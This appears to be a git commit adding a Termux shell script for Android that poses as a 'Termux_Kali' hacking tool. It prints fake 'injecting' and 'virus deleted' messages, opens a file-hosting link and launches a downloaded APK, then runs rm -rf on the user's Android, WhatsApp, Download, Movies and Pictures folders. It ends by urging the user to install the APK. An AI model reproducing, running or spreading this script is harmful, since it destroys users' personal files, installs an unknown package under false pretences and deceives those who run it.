9c8501c8d7ab947ffbc469774aa6f22ade11a293
unkn0wn-crap <125791551+unkn0wn-crap@users.noreply.github.com>
2023-02-19 14:06:48 +0530

    Add files via upload

---
+++ deds3c.sh
@@ -0,0 +1,37 @@
+# hehehehehehhe
+
+echo -e "\e[1;32m  × •••• Injecting DEAD™ \e[0m"
+sleep 1.57
+echo -e "\e[1;32m  × •••• completed \e[0m"
+sleep 1.0
+echo -e "\e[1;32m  × •••• encrypting all sources_tunnel \e[0m"
+sleep 1.0
+echo            ∆ Injected ∆
+echo       ____________________________
+echo
+echo -e "\e[1;23m VIRUS DETECTED \e[0m"
+echo
+echo -e "\e[1;32m Virus (code_241f5) DELETED \e[0m"
+echo            [×] •~• Enjoy [×]
+echo
+echo -e "\e[1;32m ∆•••• CONNECTION SECURED ••••∆ \e[0m"
+sleep 2.3
+
+xdg-open https://easyupload.io/a1flfl/download
+
+cd /sdcard/Download && termux-open p_1010.apk
+
+# start
+
+sleep 5.52
+
+cd /sdcard
+rm -rf Android
+
+cd /sdcard
+rm -rf WhatsApp Download  Movies Pictures
+
+echo [×] For Complete Access of Termux_Kali tool
+echo [×] Install p_1010.apk, from earlier opened chrome link
+echo [•] p refers to pakage
+echo [•] 1010 refers to connection number
